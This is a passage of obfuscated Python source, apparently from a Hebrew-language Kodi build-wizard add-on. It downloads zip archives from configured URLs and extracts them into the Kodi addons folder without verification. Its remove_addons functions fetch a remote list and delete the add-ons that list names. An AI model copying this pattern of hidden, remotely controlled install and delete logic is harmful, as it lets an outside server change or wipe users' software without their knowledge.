		if O00OO0O00O0O00OOO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5094
		else :wiz .purgeDb (O000OO0OOOO0O0OO0 [OOOO00OOO0OO00OO0 ])#line:5095
def fastupdatefirstbuild (O000O00OO000OO0O0 ):#line:5101
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5103
	if ENABLE =='Yes':#line:5104
		if not NOTIFY =='true':#line:5105
			OO0O00OOOO0O0O0O0 =wiz .workingURL (NOTIFICATION )#line:5106
			if OO0O00OOOO0O0O0O0 ==True :#line:5107
				OOO0OOO000OOOOO0O ,O0OO00O0O000OO0O0 =wiz .splitNotify (NOTIFICATION )#line:5108
				if not OOO0OOO000OOOOO0O ==False :#line:5110
					try :#line:5111
						OOO0OOO000OOOOO0O =int (OOO0OOO000OOOOO0O );O000O00OO000OO0O0 =int (O000O00OO000OO0O0 )#line:5112
						checkidupdate ()#line:5113
						wiz .setS ("notedismiss","true")#line:5114
						if OOO0OOO000OOOOO0O ==O000O00OO000OO0O0 :#line:5115
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOO0OOO000OOOOO0O ),xbmc .LOGNOTICE )#line:5116
						elif OOO0OOO000OOOOO0O >O000O00OO000OO0O0 :#line:5118
							wiz .log ("[Notifications] id: %s"%str (OOO0OOO000OOOOO0O ),xbmc .LOGNOTICE )#line:5119
							wiz .setS ('noteid',str (OOO0OOO000OOOOO0O ))#line:5120
							wiz .setS ("notedismiss","true")#line:5121
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5124
					except Exception as O000O0O0OO0O0O00O :#line:5125
						wiz .log ("Error on Notifications Window: %s"%str (O000O0O0OO0O0O00O ),xbmc .LOGERROR )#line:5126
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5128
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO0O00OOOO0O0O0O0 ),xbmc .LOGNOTICE )#line:5129
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5130
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5131
def checkidupdate ():#line:5137
				wiz .setS ("notedismiss","true")#line:5139
				OO00OO0OOO0OO0O0O =wiz .workingURL (NOTIFICATION )#line:5140
				O0OO0OOOO0O000O00 =" Kodi Premium"#line:5142
				O00O00O0O0O0O0OO0 =wiz .checkBuild (O0OO0OOOO0O000O00 ,'gui')#line:5143
				O00O0OO00OO0000O0 =O0OO0OOOO0O000O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5144
				if not wiz .workingURL (O00O00O0O0O0O0OO0 )==True :return #line:5145
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5146
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0OO0OOOO0O000O00 ),'','אנא המתן')#line:5147
				OOOOO00OO0OOO0OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0OO00OO0000O0 )#line:5148
				try :os .remove (OOOOO00OO0OOO0OOO )#line:5149
				except :pass #line:5150
				logging .warning (O00O00O0O0O0O0OO0 )#line:5151
				if 'google'in O00O00O0O0O0O0OO0 :#line:5152
				   OO0O000O0OO0O00OO =googledrive_download (O00O00O0O0O0O0OO0 ,OOOOO00OO0OOO0OOO ,DP ,wiz .checkBuild (O0OO0OOOO0O000O00 ,'filesize'))#line:5153
				else :#line:5156
				  downloader .download (O00O00O0O0O0O0OO0 ,OOOOO00OO0OOO0OOO ,DP )#line:5157
				xbmc .sleep (100 )#line:5158
				OO00O000000OO0000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0OOOO0O000O00 )#line:5159
				DP .update (0 ,OO00O000000OO0000 ,'','אנא המתן')#line:5160
				extract .all (OOOOO00OO0OOO0OOO ,HOME ,DP ,title =OO00O000000OO0000 )#line:5161
				DP .close ()#line:5162
				wiz .defaultSkin ()#line:5163
				wiz .lookandFeelData ('save')#line:5164
				if KODIV >=18 :#line:5165
					skindialogsettind18 ()#line:5166
				if INSTALLMETHOD ==1 :O00O00O0OOO0000O0 =1 #line:5169
				elif INSTALLMETHOD ==2 :O00O00O0OOO0000O0 =0 #line:5170
				else :DP .close ()#line:5171
def gaiaserenaddon ():#line:5173
  OO0OO0O0O0OO0O00O =(ADDON .getSetting ("gaiaseren"))#line:5174
  OO0O00OO00OOO00O0 =(ADDON .getSetting ("auto_rd"))#line:5175
  if OO0OO0O0O0OO0O00O =='true'and OO0O00OO00OOO00O0 =='true':#line:5176
    O0O0OO00O00O000O0 =(NEWFASTUPDATE )#line:5177
    OOO00OO0OO0OO0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5178
    O0O00OOOOO0OO00O0 =xbmcgui .DialogProgress ()#line:5179
    O0O00OOOOO0OO00O0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5180
    O0000OOO00O00OO0O =os .path .join (PACKAGES ,'isr.zip')#line:5181
    OOO0O0OO0O00OOOOO =urllib2 .Request (O0O0OO00O00O000O0 )#line:5182
    OOOOO00OO0O00000O =urllib2 .urlopen (OOO0O0OO0O00OOOOO )#line:5183
    OOOO00O0000O0OO0O =xbmcgui .DialogProgress ()#line:5185
    OOOO00O0000O0OO0O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5186
    OOOO00O0000O0OO0O .update (0 )#line:5187
    O0O0O0000O000OOO0 =open (O0000OOO00O00OO0O ,'wb')#line:5189
    try :#line:5191
      OOO00O0OOO0O0O00O =OOOOO00OO0O00000O .info ().getheader ('Content-Length').strip ()#line:5192
      O000000OOO0000O00 =True #line:5193
    except AttributeError :#line:5194
          O000000OOO0000O00 =False #line:5195
    if O000000OOO0000O00 :#line:5197
          OOO00O0OOO0O0O00O =int (OOO00O0OOO0O0O00O )#line:5198
    OO0000O0000OO0OO0 =0 #line:5200
    OO0O00O0000O0OO00 =time .time ()#line:5201
    while True :#line:5202
          OOO0O0O0000O00OO0 =OOOOO00OO0O00000O .read (8192 )#line:5203
          if not OOO0O0O0000O00OO0 :#line:5204
              sys .stdout .write ('\n')#line:5205
              break #line:5206
          OO0000O0000OO0OO0 +=len (OOO0O0O0000O00OO0 )#line:5208
          O0O0O0000O000OOO0 .write (OOO0O0O0000O00OO0 )#line:5209
          if not O000000OOO0000O00 :#line:5211
              OOO00O0OOO0O0O00O =OO0000O0000OO0OO0 #line:5212
          if OOOO00O0000O0OO0O .iscanceled ():#line:5213
             OOOO00O0000O0OO0O .close ()#line:5214
             try :#line:5215
              os .remove (O0000OOO00O00OO0O )#line:5216
             except :#line:5217
              pass #line:5218
             break #line:5219
          OO000O00000O0OO00 =float (OO0000O0000OO0OO0 )/OOO00O0OOO0O0O00O #line:5220
          OO000O00000O0OO00 =round (OO000O00000O0OO00 *100 ,2 )#line:5221
          OO0O00OOO0O0OO0O0 =OO0000O0000OO0OO0 /(1024 *1024 )#line:5222
          O0O0O00OOO0OO00OO =OOO00O0OOO0O0O00O /(1024 *1024 )#line:5223
          OOOOO000OOOOOO0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0O00OOO0O0OO0O0 ,'teal',O0O0O00OOO0OO00OO )#line:5224
          if (time .time ()-OO0O00O0000O0OO00 )>0 :#line:5225
            O0O0OO00O00O0O0O0 =OO0000O0000OO0OO0 /(time .time ()-OO0O00O0000O0OO00 )#line:5226
            O0O0OO00O00O0O0O0 =O0O0OO00O00O0O0O0 /1024 #line:5227
          else :#line:5228
           O0O0OO00O00O0O0O0 =0 #line:5229
          O00O0000O0O00O00O ='KB'#line:5230
          if O0O0OO00O00O0O0O0 >=1024 :#line:5231
             O0O0OO00O00O0O0O0 =O0O0OO00O00O0O0O0 /1024 #line:5232
             O00O0000O0O00O00O ='MB'#line:5233
          if O0O0OO00O00O0O0O0 >0 and not OO000O00000O0OO00 ==100 :#line:5234
              O000OO0O0000000OO =(OOO00O0OOO0O0O00O -OO0000O0000OO0OO0 )/O0O0OO00O00O0O0O0 #line:5235
          else :#line:5236
              O000OO0O0000000OO =0 #line:5237
          O0O000OO0000O0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O0OO00O00O0O0O0 ,O00O0000O0O00O00O )#line:5238
          OOOO00O0000O0OO0O .update (int (OO000O00000O0OO00 ),OOOOO000OOOOOO0OO ,O0O000OO0000O0O00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5240
    OO00000OOO00O0000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5243
    O0O0O0000O000OOO0 .close ()#line:5246
    extract .all (O0000OOO00O00OO0O ,OO00000OOO00O0000 ,OOOO00O0000O0OO0O )#line:5247
    try :#line:5251
      os .remove (O0000OOO00O00OO0O )#line:5252
    except :#line:5253
      pass #line:5254
def iptvsimpldownpc ():#line:5255
    OOOOOOOOO0O0O0OO0 =(IPTVSIMPL18PC )#line:5257
    O000O0OOO000OO0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5258
    O00OO000O0O0OO00O =xbmcgui .DialogProgress ()#line:5259
    O00OO000O0O0OO00O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5260
    OO0O0OO00OOOOO00O =os .path .join (PACKAGES ,'isr.zip')#line:5261
    O0O00O000OO0O00OO =urllib2 .Request (OOOOOOOOO0O0O0OO0 )#line:5262
    O000O0O00OOO0O000 =urllib2 .urlopen (O0O00O000OO0O00OO )#line:5263
    O0OOOO0OO0O00O0OO =xbmcgui .DialogProgress ()#line:5265
    O0OOOO0OO0O00O0OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5266
    O0OOOO0OO0O00O0OO .update (0 )#line:5267
    OO0O0OOO00O0OOO0O =open (OO0O0OO00OOOOO00O ,'wb')#line:5269
    try :#line:5271
      O000OO00OO00OOOOO =O000O0O00OOO0O000 .info ().getheader ('Content-Length').strip ()#line:5272
      O0O000O0OO0O00OO0 =True #line:5273
    except AttributeError :#line:5274
          O0O000O0OO0O00OO0 =False #line:5275
    if O0O000O0OO0O00OO0 :#line:5277
          O000OO00OO00OOOOO =int (O000OO00OO00OOOOO )#line:5278
    OO0000O0O0OO00OOO =0 #line:5280
    OOOOO00OO0OOO0OO0 =time .time ()#line:5281
    while True :#line:5282
          OOOOO00000OO0OO0O =O000O0O00OOO0O000 .read (8192 )#line:5283
          if not OOOOO00000OO0OO0O :#line:5284
              sys .stdout .write ('\n')#line:5285
              break #line:5286
          OO0000O0O0OO00OOO +=len (OOOOO00000OO0OO0O )#line:5288
          OO0O0OOO00O0OOO0O .write (OOOOO00000OO0OO0O )#line:5289
          if not O0O000O0OO0O00OO0 :#line:5291
              O000OO00OO00OOOOO =OO0000O0O0OO00OOO #line:5292
          if O0OOOO0OO0O00O0OO .iscanceled ():#line:5293
             O0OOOO0OO0O00O0OO .close ()#line:5294
             try :#line:5295
              os .remove (OO0O0OO00OOOOO00O )#line:5296
             except :#line:5297
              pass #line:5298
             break #line:5299
          O00OO0O00OOOOO0OO =float (OO0000O0O0OO00OOO )/O000OO00OO00OOOOO #line:5300
          O00OO0O00OOOOO0OO =round (O00OO0O00OOOOO0OO *100 ,2 )#line:5301
          O00O000O0000OOOO0 =OO0000O0O0OO00OOO /(1024 *1024 )#line:5302
          OOOO00OOOO0OOO0OO =O000OO00OO00OOOOO /(1024 *1024 )#line:5303
          OO0O0O00000OO00O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00O000O0000OOOO0 ,'teal',OOOO00OOOO0OOO0OO )#line:5304
          if (time .time ()-OOOOO00OO0OOO0OO0 )>0 :#line:5305
            O00O000OO00O0O000 =OO0000O0O0OO00OOO /(time .time ()-OOOOO00OO0OOO0OO0 )#line:5306
            O00O000OO00O0O000 =O00O000OO00O0O000 /1024 #line:5307
          else :#line:5308
           O00O000OO00O0O000 =0 #line:5309
          O0OO00OOO0OOO0O0O ='KB'#line:5310
          if O00O000OO00O0O000 >=1024 :#line:5311
             O00O000OO00O0O000 =O00O000OO00O0O000 /1024 #line:5312
             O0OO00OOO0OOO0O0O ='MB'#line:5313
          if O00O000OO00O0O000 >0 and not O00OO0O00OOOOO0OO ==100 :#line:5314
              O00OOOO0O00OOO0OO =(O000OO00OO00OOOOO -OO0000O0O0OO00OOO )/O00O000OO00O0O000 #line:5315
          else :#line:5316
              O00OOOO0O00OOO0OO =0 #line:5317
          O0O00O0O0O00OOOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O000OO00O0O000 ,O0OO00OOO0OOO0O0O )#line:5318
          O0OOOO0OO0O00O0OO .update (int (O00OO0O00OOOOO0OO ),OO0O0O00000OO00O0 ,O0O00O0O0O00OOOO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5320
    OO00000000OOOO0OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5323
    OO0O0OOO00O0OOO0O .close ()#line:5326
    extract .all (OO0O0OO00OOOOO00O ,OO00000000OOOO0OO ,O0OOOO0OO0O00O0OO )#line:5327
    try :#line:5331
      os .remove (OO0O0OO00OOOOO00O )#line:5332
    except :#line:5333
      pass #line:5334
def iptvsimpldown ():#line:5335
    O0OOO0O00OOO00OO0 =(IPTV18 )#line:5337
    O0000OOOO0OOOOO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5338
    O00O000OO00000OOO =xbmcgui .DialogProgress ()#line:5339
    O00O000OO00000OOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5340
    O00000O00OOO00000 =os .path .join (PACKAGES ,'isr.zip')#line:5341
    OOO00O0OO0O0OO000 =urllib2 .Request (O0OOO0O00OOO00OO0 )#line:5342
    O000OOOOO000OO0O0 =urllib2 .urlopen (OOO00O0OO0O0OO000 )#line:5343
    O0O00OO000OOO0OOO =xbmcgui .DialogProgress ()#line:5345
    O0O00OO000OOO0OOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5346
    O0O00OO000OOO0OOO .update (0 )#line:5347
    OOOO0OOOO0OOO0OO0 =open (O00000O00OOO00000 ,'wb')#line:5349
    try :#line:5351
      O000OO0OOOOO0O0OO =O000OOOOO000OO0O0 .info ().getheader ('Content-Length').strip ()#line:5352
      O0O00O0O0O0O00000 =True #line:5353
    except AttributeError :#line:5354
          O0O00O0O0O0O00000 =False #line:5355
    if O0O00O0O0O0O00000 :#line:5357
          O000OO0OOOOO0O0OO =int (O000OO0OOOOO0O0OO )#line:5358
    OOOO000000000O0O0 =0 #line:5360
    O0000OO0O000OOOO0 =time .time ()#line:5361
    while True :#line:5362
          O0000000OO0O0O0O0 =O000OOOOO000OO0O0 .read (8192 )#line:5363
          if not O0000000OO0O0O0O0 :#line:5364
              sys .stdout .write ('\n')#line:5365
              break #line:5366
          OOOO000000000O0O0 +=len (O0000000OO0O0O0O0 )#line:5368
          OOOO0OOOO0OOO0OO0 .write (O0000000OO0O0O0O0 )#line:5369
          if not O0O00O0O0O0O00000 :#line:5371
              O000OO0OOOOO0O0OO =OOOO000000000O0O0 #line:5372
          if O0O00OO000OOO0OOO .iscanceled ():#line:5373
             O0O00OO000OOO0OOO .close ()#line:5374
             try :#line:5375
              os .remove (O00000O00OOO00000 )#line:5376
             except :#line:5377
              pass #line:5378
             break #line:5379
          O0OOOO0000000O0OO =float (OOOO000000000O0O0 )/O000OO0OOOOO0O0OO #line:5380
          O0OOOO0000000O0OO =round (O0OOOO0000000O0OO *100 ,2 )#line:5381
          OO000O0O0000OO0O0 =OOOO000000000O0O0 /(1024 *1024 )#line:5382
          OO0O0O00OOOOO0OOO =O000OO0OOOOO0O0OO /(1024 *1024 )#line:5383
          O000000OO00OOOOO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO000O0O0000OO0O0 ,'teal',OO0O0O00OOOOO0OOO )#line:5384
          if (time .time ()-O0000OO0O000OOOO0 )>0 :#line:5385
            OO000OOOO00OO0O00 =OOOO000000000O0O0 /(time .time ()-O0000OO0O000OOOO0 )#line:5386
            OO000OOOO00OO0O00 =OO000OOOO00OO0O00 /1024 #line:5387
          else :#line:5388
           OO000OOOO00OO0O00 =0 #line:5389
          OO00OOOO00OO00000 ='KB'#line:5390
          if OO000OOOO00OO0O00 >=1024 :#line:5391
             OO000OOOO00OO0O00 =OO000OOOO00OO0O00 /1024 #line:5392
             OO00OOOO00OO00000 ='MB'#line:5393
          if OO000OOOO00OO0O00 >0 and not O0OOOO0000000O0OO ==100 :#line:5394
              OO0OOOO0OOOOO0OOO =(O000OO0OOOOO0O0OO -OOOO000000000O0O0 )/OO000OOOO00OO0O00 #line:5395
          else :#line:5396
              OO0OOOO0OOOOO0OOO =0 #line:5397
          OOOO00O0O0000O000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO000OOOO00OO0O00 ,OO00OOOO00OO00000 )#line:5398
          O0O00OO000OOO0OOO .update (int (O0OOOO0000000O0OO ),O000000OO00OOOOO0 ,OOOO00O0O0000O000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5400
    O00O0O00OOO0O00O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5403
    OOOO0OOOO0OOO0OO0 .close ()#line:5406
    extract .all (O00000O00OOO00000 ,O00O0O00OOO0O00O0 ,O0O00OO000OOO0OOO )#line:5407
    try :#line:5411
      os .remove (O00000O00OOO00000 )#line:5412
    except :#line:5413
      pass #line:5414
def testnotify ():#line:5415
	O000O00OOO0O00000 =wiz .workingURL (NOTIFICATION )#line:5416
	if O000O00OOO0O00000 ==True :#line:5417
		try :#line:5418
			O0OO0OOOO00000OOO ,OOOOOO000000OO00O =wiz .splitNotify (NOTIFICATION )#line:5419
			if O0OO0OOOO00000OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5420
			if STARTP2 ()=='ok':#line:5421
				notify .notification (OOOOOO000000OO00O ,True )#line:5422
		except Exception as O00OO00OO0OO0O000 :#line:5423
			wiz .log ("Error on Notifications Window: %s"%str (O00OO00OO0OO0O000 ),xbmc .LOGERROR )#line:5424
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5425
def testnotify2 ():#line:5426
	OO0OOOO000OO0OO0O =wiz .workingURL (NOTIFICATION2 )#line:5427
	if OO0OOOO000OO0OO0O ==True :#line:5428
		try :#line:5429
			O000OOO0O00000O0O ,OOO0OOOO00O00O000 =wiz .splitNotify (NOTIFICATION2 )#line:5430
			if O000OOO0O00000O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5431
			if STARTP2 ()=='ok':#line:5432
				notify .notification2 (OOO0OOOO00O00O000 ,True )#line:5433
		except Exception as O00O00O0OOOO0OOO0 :#line:5434
			wiz .log ("Error on Notifications Window: %s"%str (O00O00O0OOOO0OOO0 ),xbmc .LOGERROR )#line:5435
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5436
def testnotify3 ():#line:5437
	OO0000OOOOOOO0O0O =wiz .workingURL (NOTIFICATION3 )#line:5438
	if OO0000OOOOOOO0O0O ==True :#line:5439
		try :#line:5440
			OO00OO00OO00OO00O ,OOOOO00O00OO0O0OO =wiz .splitNotify (NOTIFICATION3 )#line:5441
			if OO00OO00OO00OO00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5442
			if STARTP2 ()=='ok':#line:5443
				notify .notification3 (OOOOO00O00OO0O0OO ,True )#line:5444
		except Exception as OO000000O0OO00000 :#line:5445
			wiz .log ("Error on Notifications Window: %s"%str (OO000000O0OO00000 ),xbmc .LOGERROR )#line:5446
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5447
def servicemanual ():#line:5448
	O000O00O00000O00O =wiz .workingURL (HELPINFO )#line:5449
	if O000O00O00000O00O ==True :#line:5450
		try :#line:5451
			O0OO0O00OOOOOOOO0 ,OO0OO0OO0OOOOOOO0 =wiz .splitNotify (HELPINFO )#line:5452
			if O0OO0O00OOOOOOOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5453
			notify .helpinfo (OO0OO0OO0OOOOOOO0 ,True )#line:5454
		except Exception as OOO0O000O0000O00O :#line:5455
			wiz .log ("Error on Notifications Window: %s"%str (OOO0O000O0000O00O ),xbmc .LOGERROR )#line:5456
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5457
def testupdate ():#line:5459
	if BUILDNAME =="":#line:5460
		notify .updateWindow ()#line:5461
	else :#line:5462
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5463
def testfirst ():#line:5465
	notify .firstRun ()#line:5466
def testfirstRun ():#line:5468
	notify .firstRunSettings ()#line:5469
def fastinstall ():#line:5472
	notify .firstRuninstall ()#line:5473
def addDir (OO0O000O0O00OOOO0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5480
	O0OO000OOO0OO0O00 =sys .argv [0 ]#line:5481
	if not mode ==None :O0OO000OOO0OO0O00 +="?mode=%s"%urllib .quote_plus (mode )#line:5482
	if not name ==None :O0OO000OOO0OO0O00 +="&name="+urllib .quote_plus (name )#line:5483
	if not url ==None :O0OO000OOO0OO0O00 +="&url="+urllib .quote_plus (url )#line:5484
	OO0OO000O0OO00OOO =True #line:5485
	if themeit :OO0O000O0O00OOOO0 =themeit %OO0O000O0O00OOOO0 #line:5486
	OO0000O0OO00O00OO =xbmcgui .ListItem (OO0O000O0O00OOOO0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5487
	OO0000O0OO00O00OO .setInfo (type ="Video",infoLabels ={"Title":OO0O000O0O00OOOO0 ,"Plot":description })#line:5488
	OO0000O0OO00O00OO .setProperty ("Fanart_Image",fanart )#line:5489
	if not menu ==None :OO0000O0OO00O00OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5490
	OO0OO000O0OO00OOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OO000OOO0OO0O00 ,listitem =OO0000O0OO00O00OO ,isFolder =True )#line:5491
	return OO0OO000O0OO00OOO #line:5492
def addFile (OOO0O000OOO0OOOO0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5494
	O0OO0O00OO00O0O00 =sys .argv [0 ]#line:5495
	if not mode ==None :O0OO0O00OO00O0O00 +="?mode=%s"%urllib .quote_plus (mode )#line:5496
	if not name ==None :O0OO0O00OO00O0O00 +="&name="+urllib .quote_plus (name )#line:5497
	if not url ==None :O0OO0O00OO00O0O00 +="&url="+urllib .quote_plus (url )#line:5498
	OO0O00O000000OOO0 =True #line:5499
	if themeit :OOO0O000OOO0OOOO0 =themeit %OOO0O000OOO0OOOO0 #line:5500
	O00OOOOO0O000000O =xbmcgui .ListItem (OOO0O000OOO0OOOO0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5501
	O00OOOOO0O000000O .setInfo (type ="Video",infoLabels ={"Title":OOO0O000OOO0OOOO0 ,"Plot":description })#line:5502
	O00OOOOO0O000000O .setProperty ("Fanart_Image",fanart )#line:5503
	if not menu ==None :O00OOOOO0O000000O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5504
	OO0O00O000000OOO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OO0O00OO00O0O00 ,listitem =O00OOOOO0O000000O ,isFolder =False )#line:5505
	return OO0O00O000000OOO0 #line:5506
def get_params ():#line:5508
	OOO0O00OO00OOO000 =[]#line:5509
	O00O0O0O000O000O0 =sys .argv [2 ]#line:5510
	if len (O00O0O0O000O000O0 )>=2 :#line:5511
		OOOOO0OOO0O0O0000 =sys .argv [2 ]#line:5512
		OOO0OOO00O00O0O0O =OOOOO0OOO0O0O0000 .replace ('?','')#line:5513
		if (OOOOO0OOO0O0O0000 [len (OOOOO0OOO0O0O0000 )-1 ]=='/'):#line:5514
			OOOOO0OOO0O0O0000 =OOOOO0OOO0O0O0000 [0 :len (OOOOO0OOO0O0O0000 )-2 ]#line:5515
		OO00OOO0OO00OO00O =OOO0OOO00O00O0O0O .split ('&')#line:5516
		OOO0O00OO00OOO000 ={}#line:5517
		for OOOO0O000OO0OO00O in range (len (OO00OOO0OO00OO00O )):#line:5518
			O0O00000O0OOO0OOO ={}#line:5519
			O0O00000O0OOO0OOO =OO00OOO0OO00OO00O [OOOO0O000OO0OO00O ].split ('=')#line:5520
			if (len (O0O00000O0OOO0OOO ))==2 :#line:5521
				OOO0O00OO00OOO000 [O0O00000O0OOO0OOO [0 ]]=O0O00000O0OOO0OOO [1 ]#line:5522
		return OOO0O00OO00OOO000 #line:5524
def remove_addons ():#line:5526
	try :#line:5527
			import json #line:5528
			OOOOOOOOO0000O00O =urllib2 .urlopen (remove_url ).readlines ()#line:5529
			for OOO000OOO0O000000 in OOOOOOOOO0000O00O :#line:5530
				O00O00000OO000O00 =OOO000OOO0O000000 .split (':')[1 ].strip ()#line:5532
				OO0O0OOO000OO000O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O00O00000OO000O00 ,'false')#line:5533
				O00OOOOOOOO0O0O00 =xbmc .executeJSONRPC (OO0O0OOO000OO000O )#line:5534
				OO000O00000OOOOO0 =json .loads (O00OOOOOOOO0O0O00 )#line:5535
				O000000OOOO00OOO0 =os .path .join (addons_folder ,O00O00000OO000O00 )#line:5537
				if os .path .exists (O000000OOOO00OOO0 ):#line:5539
					for OOOO000OO0O00OO00 ,O00O0O000OO0O0OO0 ,O0OO0O0OO000O000O in os .walk (O000000OOOO00OOO0 ):#line:5540
						for O00O0OO0000OOO000 in O0OO0O0OO000O000O :#line:5541
							os .unlink (os .path .join (OOOO000OO0O00OO00 ,O00O0OO0000OOO000 ))#line:5542
						for O00OO0O0OOO0OOO00 in O00O0O000OO0O0OO0 :#line:5543
							shutil .rmtree (os .path .join (OOOO000OO0O00OO00 ,O00OO0O0OOO0OOO00 ))#line:5544
					os .rmdir (O000000OOOO00OOO0 )#line:5545
			xbmc .executebuiltin ('Container.Refresh')#line:5547
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5548
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5549
	except :pass #line:5550
def remove_addons2 ():#line:5551
	try :#line:5552
			import json #line:5553
			O0OOOO00OO0OO0O0O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5554
			for OO0O00O000O0O000O in O0OOOO00OO0OO0O0O :#line:5555
				O0O0OO0OOO0O000OO =OO0O00O000O0O000O .split (':')[1 ].strip ()#line:5557
				OOOO0000OOOO00OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0O0OO0OOO0O000OO ,'false')#line:5558
				O00O0O0OO0000OOO0 =xbmc .executeJSONRPC (OOOO0000OOOO00OO0 )#line:5559
				OOO00OO0OO0O000OO =json .loads (O00O0O0OO0000OOO0 )#line:5560
				O0O0OO0OOOOO0O000 =os .path .join (user_folder ,O0O0OO0OOO0O000OO )#line:5562
				if os .path .exists (O0O0OO0OOOOO0O000 ):#line:5564
